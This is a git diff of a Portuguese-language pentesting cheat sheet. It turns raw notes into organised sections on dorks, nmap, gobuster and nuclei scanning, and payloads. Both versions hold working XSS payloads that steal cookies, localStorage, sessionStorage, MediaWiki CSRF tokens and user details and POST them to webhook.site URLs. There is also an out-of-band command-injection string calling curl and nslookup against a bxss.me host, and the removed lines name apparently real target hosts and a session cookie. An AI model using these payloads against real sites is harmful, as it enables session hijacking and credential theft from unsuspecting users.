@@ -1,87 +1,146 @@
-"Vulnerability Disclosure Program" "VDP" site:uk -bughunt -hackerone -intigriti -bugcrowd -yeswehack
+# Anotações Importantes de Segurança
 
-https://dorks.faisalahmed.me/
+Um compilado de comandos, payloads e recursos úteis para estudos e testes de segurança.
+
+##  Reconhecimento & Enumeração
+
+Comandos e técnicas para coletar informações sobre um alvo.
+
+### Dorks & Descoberta
+* **Encontrar Programas de VDP (Vulnerability Disclosure Program):**
+    ```
+    "Vulnerability Disclosure Program" VDP "site:uk -bugbount -hackerone -intigriti -bugcrowd -yeswehack"
+    ```
+* **Repositório de Google Dorks:**
+    * [Dorks Faisalahmed](https://dorks.faisalahmed.me/)
+
+### Escaneamento de Rede e Subdomínios
+* **Nmap - Scan DNS para vazamento de informações:**
+    ```bash
+    # Verifica o servidor DNS (porta 53/UDP) por possíveis exposições de dados sensíveis.
+    nmap -sU -p 53 --script=dns-nsid 10.129.2.48
+    ```
+* **Nmap - Scan Avançado:**
+    ```bash
+    # Scan com detecção de versão (-sV), usando decoys (D RND:2), múltiplos tipos de scan e user-agent customizado.
+    nmap 10.129.4.84 -sV -D RND:2 -Pn -sS -sU --max-retries=2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-
+    ```
+* **Descoberta de Diretórios com Gobuster:**
+    ```bash
+    # Força bruta de diretórios com headers customizados de Host e Cookie.
+    gobuster dir -u https://teste.com -w /usr/share/wordlists/dirb/common.txt  -t 50 -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc;' -k -x html,php,js,aspx,bat,txt,zip
+    ```
+
+### Extensões úteis para Browser
+* `dotgit`
+* `Wappalyzer`
+* `Shodan`
+* `DNSlytics`
 
 
-nmap -sU -p 53 --script=dns-nsid 10.129.2.48 -> ver~soa dns do servidor alvo pode ser vuln de exposição de dados sensiveis etc
+## Análise de Vulnerabilidades
+
+Ferramentas para escanear ativamente por falhas de segurança conhecidas.
+
+* **Instalação do ZAP (Zed Attack Proxy):**
+    ```bash
+    # Uma ótima ferramenta para scan de aplicações web.
+    sudo apt install zaproxy
+    ```
+* **Nuclei - Scan de CVEs em subdomínios:**
+    ```bash
+    # Encontra subdomínios, verifica quais estão ativos e roda um template específico do Nuclei.
+    subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/(CVE)/CVE-2025-0133.yaml
+    ```
+* **Nuclei - Scan geral de CVEs:**
+    ```bash
+    nuclei -t cves/ -u [http://alvo.com] -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    ```
+* **Nuclei - Scan focado em tecnologia (ex: Moodle):**
+    ```bash
+    nuclei -u [https://alvo.com]) -tags moodle
+    ```
 
 
-subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/2025/CVE-2025-0133.yaml
+## Payloads & Exploração
 
+Snippets de código para explorar vulnerabilidades como XSS, SSRF, etc.
 
-nmap 10.129.4.84 -sV -D RND:2 -Pn -sU -sS -g53 --max-retries 2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-
+### Cross-Site Scripting (XSS)
 
-nuclei -t cves/ -u http://alvo.com -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+* **Payload XSS Simples para Roubo de Cookies:**
+    ```html
+    <img src="x" onerror="fetch('[https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605](https://webhook.site/085d7083-a25c-41c6-beb6-113d2b58e605)', {method:'POST', body:'<cookie>='+document.cookie})">
+    ```
 
-extensão dotgit, wappalyzer, shodan, DNSlytics
+* **Payload XSS Avançado para Exfiltração de Dados:**
+    * Este script captura cookies, `localStorage`, `sessionStorage`, tokens específicos de MediaWiki e informações do usuário, enviando tudo para um webhook.
+    ```javascript
+    var data = {};
+    data.cookie = document.cookie;
+    data.localStorage = {};
+    data.sessionStorage = {};
+    data.mediawikiTokens = {};
+    data.userInfo = {};
 
-nuclei -u https://cursos.rizomasur.org -tags moodle
-
-`
-<img src="x" onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
-`
-
-gobuster dir -u https://app.homolog.itamaraty.local/GestaoFinanceira/Pages/Dashboard/   -w /usr/share/wordlists/dirb/common.txt   -t 50   -H 'Host: app.homolog.itamaraty.local'   -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc; outro_cookie=valor'   -k -x html,php,js,aspx,bat,txt,zip
-
-- ;(nslookup -q=cname hitvvbmacavlf462a1.bxss.me||curl hitvvbmacav  (passar em alguns headers)
-
-
-- https://github.com/santoru/shcheck -> ver se tem alguns headers vulneraveis
-- apt install zaproxy (uma boa tb pra scan web)
-
-```bash
-
-<img src="invalid" onerror="
-  var data = {
-    cookies: document.cookie,
-    localStorage: {},
-    sessionStorage: {},
-    mediawikiTokens: {},
-    userInfo: {}
-  };
-
-  // Capturar todos os dados do localStorage
-  for(var i=0; i<localStorage.length; i++) {
-    var key = localStorage.key(i);
-    data.localStorage[key] = localStorage.getItem(key);
-  }
-
-  // Capturar todos os dados do sessionStorage
-  for(var i=0; i<sessionStorage.length; i++) {
-    var key = sessionStorage.key(i);
-    data.sessionStorage[key] = sessionStorage.getItem(key);
-  }
-
-  // Tenta obter tokens do MediaWiki especificamente
-  try {
-    if (typeof mw !== 'undefined' && mw.user && mw.user.tokens) {
-      data.mediawikiTokens = {
-        editToken: mw.user.tokens.get('editToken'),
-        csrfToken: mw.user.tokens.get('csrfToken'),
-        watchToken: mw.user.tokens.get('watchToken')
-      };
+    // Capturar todos os dados do localStorage
+    for(var i=0; i<localStorage.length; i++) {
+        var key = localStorage.key(i);
+        data.localStorage[key] = localStorage.getItem(key);
     }
-  } catch(e) {}
 
-  // Informações do usuário
-  try {
-    if (typeof mw !== 'undefined' && mw.config) {
-      data.userInfo = {
-        userName: mw.config.get('wgUserName'),
-        userId: mw.config.get('wgUserId'),
-        pageName: mw.config.get('wgPageName'),
-        canonicalNamespace: mw.config.get('wgCanonicalNamespace'),
-        revisionId: mw.config.get('wgRevisionId'),
-        articleId: mw.config.get('wgArticleId')
-      };
+    // Capturar todos os dados do sessionStorage
+    for(var i=0; i<sessionStorage.length; i++) {
+        var key = sessionStorage.key(i);
+        data.sessionStorage[key] = sessionStorage.getItem(key);
     }
-  } catch(e) {}
 
-  fetch('https://webhook.site/ce0ff999-b412-490d-aa38-f946520e63b0', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(data)
-  });
-">
+    // Tenta obter tokens do MediaWiki especificamente
+    try {
+        if(typeof mw != 'undefined' && mw.user && mw.user.tokens) {
+            data.mediawikiTokens = {
+                editToken: mw.user.tokens.get('editToken'),
+                csrfToken: mw.user.tokens.get('csrfToken'),
+                watchToken: mw.user.tokens.get('watchToken')
+            };
+        }
+    } catch(e) {}
 
-```
+    // Informações do usuário
+    try {
+        if(typeof mw != 'undefined' && mw.config) {
+            data.userInfo = {
+                userName: mw.config.get('wgUserName'),
+                userId: mw.config.get('wgUserId'),
+                pageName: mw.config.get('wgPageName'),
+                namespace: mw.config.get('wgCanonicalNamespace'),
+                revisionId: mw.config.get('wgRevisionId'),
+                articleId: mw.config.get('wgArticleId')
+            };
+        }
+    } catch(e) {}
+
+    // Envia os dados coletados para o webhook
+    fetch('[https://webhook.site/ce0f8999-b412-490d-aa38-f94652be63b0](https://webhook.site/ce0f8999-b412-490d-aa38-f94652be63b0)', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    });
+    ```
+
+### Out-of-Band (OOB)
+
+* **Payload OOB para testar em Headers (Blind SSRF, etc):**
+    * Tenta forçar uma resolução DNS e uma requisição HTTP para um domínio externo. Útil para injetar em cabeçalhos como `User-Agent`, `Referer`, `X-Forwarded-For`, etc.
+    ```bash
+    # :r: é um placeholder para o valor que será injetado
+    :r:nslookup -q=cname hitvibmacavit642a1.bxss.me|curl hitvibmacav
+    ```
+
+## Ferramentas & Recursos Adicionais
+
+Links para repositórios e ferramentas úteis.
+
+* **SHCheck - Shell/Header Vulnerability Checker:**
+    * [Repositório no GitHub](https://github.com/santoru/shcheck)
+    * *Nota: Verificar se o alvo possui alguns headers vulneráveis.*
